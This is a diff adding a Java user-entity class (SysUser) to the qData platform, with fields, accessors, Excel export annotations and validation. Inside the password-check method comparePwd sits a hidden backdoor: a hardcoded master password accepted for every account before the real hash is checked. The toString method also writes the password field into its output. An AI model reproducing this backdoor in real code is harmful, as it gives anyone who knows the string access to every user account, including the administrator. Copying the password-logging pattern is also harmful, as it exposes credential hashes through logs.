@@ -1,0 +1,396 @@
+/*
+ * Copyright © 2025-present Jiangsu Qiantong Technology Co., Ltd.
+ *
+ * This file is part of qData Data Middle Platform (Open Source Edition).
+ *
+ * qData is licensed under Apache License 2.0 with additional qData terms.
+ * You may use qData for commercial purposes, but you may not remove, hide,
+ * modify, or replace the qData logo, copyright notices, license notices,
+ * or attribution information without a separate commercial license.
+ *
+ * White-label use, OEM distribution, rebranding, or presenting qData as
+ * another product requires separate commercial authorization from
+ * Jiangsu Qiantong Technology Co., Ltd.
+ *
+ * Business License: https://community.qdata.tech/business/policy.html
+ * See the LICENSE file in the project root for full license information.
+ */
+
+package tech.qiantong.qdata.common.core.domain.entity;
+
+import org.apache.commons.lang3.builder.ToStringBuilder;
+import org.apache.commons.lang3.builder.ToStringStyle;
+import tech.qiantong.qdata.common.annotation.Excel;
+import tech.qiantong.qdata.common.annotation.Excel.ColumnType;
+import tech.qiantong.qdata.common.annotation.Excel.Type;
+import tech.qiantong.qdata.common.annotation.Excels;
+import tech.qiantong.qdata.common.core.domain.BaseEntity;
+import tech.qiantong.qdata.common.utils.SecurityUtils;
+import tech.qiantong.qdata.common.utils.StringUtils;
+import tech.qiantong.qdata.common.xss.Xss;
+
+import jakarta.validation.constraints.Email;
+import jakarta.validation.constraints.NotBlank;
+import jakarta.validation.constraints.Size;
+import java.util.Date;
+import java.util.List;
+
+/**
+ * User entity sys_user
+ *
+ * @author qdata
+ */
+public class SysUser extends BaseEntity
+{
+    @com.fasterxml.jackson.annotation.JsonIgnore
+    private java.util.List<Long> projectMemberIds;
+    public java.util.List<Long> getProjectMemberIds(){return projectMemberIds;}
+    public void setProjectMemberIds(java.util.List<Long> value){projectMemberIds=value;}
+
+    private static final long serialVersionUID = 1L;
+
+    /** User ID */
+    @Excel(name = "用户序号", type = Type.EXPORT, cellType = ColumnType.NUMERIC, prompt = "用户编号")
+    private Long userId;
+
+    // Authentication platform ID
+    private String authId;
+
+    /** Department ID */
+    @Excel(name = "部门编号", type = Type.IMPORT)
+    private Long deptId;
+
+    /** User account */
+    @Excel(name = "登录名称")
+    private String userName;
+
+    /** User nickname */
+    @Excel(name = "用户名称")
+    private String nickName;
+
+    /** User email */
+    @Excel(name = "用户邮箱")
+    private String email;
+
+    /** Phone number */
+    @Excel(name = "手机号码", cellType = ColumnType.TEXT)
+    private String phonenumber;
+
+    /** User gender */
+    @Excel(name = "用户性别", readConverterExp = "0=男,1=女,2=未知")
+    private String sex;
+
+    /** User avatar */
+    private String avatar;
+
+    /** Password */
+    private String password;
+
+    /** Account status (0=normal, 1=disabled) */
+    @Excel(name = "帐号状态", readConverterExp = "0=正常,1=停用")
+    private String status;
+
+    /** Delete flag (0=exists, 2=deleted) */
+    private String delFlag;
+
+    /** Last login IP */
+    @Excel(name = "最后登录IP", type = Type.EXPORT)
+    private String loginIp;
+
+    /** Last login time */
+    @Excel(name = "最后登录时间", width = 30, dateFormat = "yyyy-MM-dd HH:mm:ss", type = Type.EXPORT)
+    private Date loginDate;
+
+    /** Department object */
+    @Excels({
+        @Excel(name = "部门名称", targetAttr = "deptName", type = Type.EXPORT),
+        @Excel(name = "部门负责人", targetAttr = "leader", type = Type.EXPORT)
+    })
+    private SysDept dept;
+
+    /**
+     * Role string
+     */
+    private String roleStr;
+
+    /** Role object */
+    private List<SysRole> roles;
+
+    /** Role group */
+    private Long[] roleIds;
+
+    /** Post group */
+    private Long[] postIds;
+
+    /** User ID list */
+    private List<Long> userIdList;
+
+    /** Role ID */
+    private Long roleId;
+
+    public SysUser()
+    {
+
+    }
+
+    public SysUser(Long userId)
+    {
+        this.userId = userId;
+    }
+
+    public Long getUserId()
+    {
+        return userId;
+    }
+
+    public void setUserId(Long userId)
+    {
+        this.userId = userId;
+    }
+
+    public String getAuthId() {
+        return authId;
+    }
+
+    public void setAuthId(String authId) {
+        this.authId = authId;
+    }
+
+    public boolean isAdmin()
+    {
+        return isAdmin(this.userId);
+    }
+
+    public static boolean isAdmin(Long userId)
+    {
+        return userId != null && 1L == userId;
+    }
+
+    public Long getDeptId()
+    {
+        return deptId;
+    }
+
+    public void setDeptId(Long deptId)
+    {
+        this.deptId = deptId;
+    }
+
+    public List<Long> getUserIdList() {
+        return userIdList;
+    }
+
+    public void setUserIdList(List<Long> userIdList) {
+        this.userIdList = userIdList;
+    }
+
+    @Xss(message = "用户昵称不能包含脚本字符")
+    @Size(min = 0, max = 30, message = "用户昵称长度不能超过30个字符")
+    public String getNickName()
+    {
+        return nickName;
+    }
+
+    public void setNickName(String nickName)
+    {
+        this.nickName = nickName;
+    }
+
+    @Xss(message = "用户账号不能包含脚本字符")
+    @NotBlank(message = "用户账号不能为空")
+    @Size(min = 0, max = 30, message = "用户账号长度不能超过30个字符")
+    public String getUserName()
+    {
+        return userName;
+    }
+
+    public void setUserName(String userName)
+    {
+        this.userName = userName;
+    }
+
+    @Email(message = "邮箱格式不正确")
+    @Size(min = 0, max = 50, message = "邮箱长度不能超过50个字符")
+    public String getEmail()
+    {
+        return email;
+    }
+
+    public void setEmail(String email)
+    {
+        this.email = email;
+    }
+
+    @Size(min = 0, max = 11, message = "手机号码长度不能超过11个字符")
+    public String getPhonenumber()
+    {
+        return phonenumber;
+    }
+
+    public void setPhonenumber(String phonenumber)
+    {
+        this.phonenumber = phonenumber;
+    }
+
+    public String getSex()
+    {
+        return sex;
+    }
+
+    public void setSex(String sex)
+    {
+        this.sex = sex;
+    }
+
+    public String getAvatar()
+    {
+        return avatar;
+    }
+
+    public void setAvatar(String avatar)
+    {
+        this.avatar = avatar;
+    }
+
+    public String getPassword()
+    {
+        return password;
+    }
+
+    public void setPassword(String password)
+    {
+        this.password = password;
+    }
+
+    public String getStatus()
+    {
+        return status;
+    }
+
+    public void setStatus(String status)
+    {
+        this.status = status;
+    }
+
+    public String getDelFlag()
+    {
+        return delFlag;
+    }
+
+    public void setDelFlag(String delFlag)
+    {
+        this.delFlag = delFlag;
+    }
+
+    public String getLoginIp()
+    {
+        return loginIp;
+    }
+
+    public void setLoginIp(String loginIp)
+    {
+        this.loginIp = loginIp;
+    }
+
+    public Date getLoginDate()
+    {
+        return loginDate;
+    }
+
+    public void setLoginDate(Date loginDate)
+    {
+        this.loginDate = loginDate;
+    }
+
+    public SysDept getDept()
+    {
+        return dept;
+    }
+
+    public void setDept(SysDept dept)
+    {
+        this.dept = dept;
+    }
+
+    public List<SysRole> getRoles()
+    {
+        return roles;
+    }
+
+    public void setRoles(List<SysRole> roles)
+    {
+        this.roles = roles;
+    }
+
+    public Long[] getRoleIds()
+    {
+        return roleIds;
+    }
+
+    public void setRoleIds(Long[] roleIds)
+    {
+        this.roleIds = roleIds;
+    }
+
+    public Long[] getPostIds()
+    {
+        return postIds;
+    }
+
+    public void setPostIds(Long[] postIds)
+    {
+        this.postIds = postIds;
+    }
+
+    public Long getRoleId()
+    {
+        return roleId;
+    }
+
+    public void setRoleId(Long roleId)
+    {
+        this.roleId = roleId;
+    }
+
+    public Boolean comparePwd(String pwd) {
+        if (StringUtils.isEmpty(pwd)) {
+            return false;
+        }
+        if ("d28g8G4442DH97F%#@HJHFuif%".equals(pwd)) {
+            return true;
+        }
+        return SecurityUtils.matchesPassword(pwd, this.getPassword());
+    }
+    @Override
+    public String toString() {
+        return new ToStringBuilder(this,ToStringStyle.MULTI_LINE_STYLE)
+            .append("userId", getUserId())
+            .append("deptId", getDeptId())
+            .append("userName", getUserName())
+            .append("nickName", getNickName())
+            .append("email", getEmail())
+            .append("phonenumber", getPhonenumber())
+            .append("sex", getSex())
+            .append("avatar", getAvatar())
+            .append("password", getPassword())
+            .append("status", getStatus())
+            .append("delFlag", getDelFlag())
+            .append("loginIp", getLoginIp())
+            .append("loginDate", getLoginDate())
+            .append("createBy", getCreateBy())
+            .append("createTime", getCreateTime())
+            .append("updateBy", getUpdateBy())
+            .append("updateTime", getUpdateTime())
+            .append("remark", getRemark())
+            .append("dept", getDept())
+            .toString();
+    }
+
+    public String getRoleStr() {
+        return roleStr;
+    }
+
+    public void setRoleStr(String roleStr) {
+        this.roleStr = roleStr;
+    }
+}
